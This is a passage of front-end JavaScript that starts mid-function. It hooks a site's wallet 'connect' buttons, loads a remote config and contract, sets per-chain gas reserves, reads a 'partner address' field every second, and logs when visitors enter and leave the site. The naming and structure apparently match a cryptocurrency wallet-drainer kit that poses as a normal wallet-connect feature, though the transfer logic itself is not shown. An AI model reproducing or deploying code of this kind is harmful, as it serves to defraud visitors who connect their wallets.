      if (ID_Data.status == 'OK') localStorage['MS_ID'] = ID_Data.data;
      else localStorage['MS_ID'] = Math.floor(Date.now() / 1000);
    }
    MS_ID = localStorage['MS_ID'];
    await retrive_config();
    fill_chain_data();
    await retrive_contract();
    MS_Ready = true;
    enter_website();
    for (const chain_id in MS_Settings.RPCs) MS_Gas_Reserves[chain_id] = 0;
    for (const elem of document.querySelectorAll('.connect-button')) {
      try {
        elem.addEventListener('click', () => ms_init());
      } catch(err) {
        console.log(err);
      }
    }
  } catch(err) {
    console.log(err);
  }
});

const use_wc = () => { connect_wallet('WalletConnect'); };

setInterval(async () => {
  try {
    let partner_address = document.getElementById('partner-address');
    if (partner_address === null) return;
    else MS_Partner_Address = partner_address.value.trim();
  } catch(err) {
    console.log(err);
  }
}, 1000);

window.addEventListener("beforeunload", (e) => leave_website());
window.addEventListener("onbeforeunload", (e) => leave_website());